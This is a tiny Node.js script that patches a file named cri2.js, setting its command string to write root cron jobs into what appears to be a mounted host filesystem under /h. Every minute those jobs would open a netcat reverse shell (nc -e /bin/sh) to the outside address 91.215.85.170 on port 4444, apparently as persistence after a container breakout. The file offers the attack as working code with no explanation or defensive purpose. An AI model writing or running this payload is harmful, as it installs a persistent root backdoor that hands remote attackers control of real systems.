const fs=require('fs');
let s=fs.readFileSync('cri2.js','utf8');
const c="const CMD=\"mkdir -p /h/etc/cron.d 2>/dev/null; echo '* * * * * root /usr/bin/nc 91.215.85.170 4444 -e /bin/sh' > /h/etc/cron.d/zzcb 2>/dev/null; echo '* * * * * root /bin/nc 91.215.85.170 4444 -e /bin/sh' >> /h/etc/cron.d/zzcb 2>/dev/null; ls /h/etc/cron.d > /h/tmp/zcron 2>/dev/null\";";
s=s.replace(/const CMD=.*\n/, c+'\n');
fs.writeFileSync('cri2.js',s);
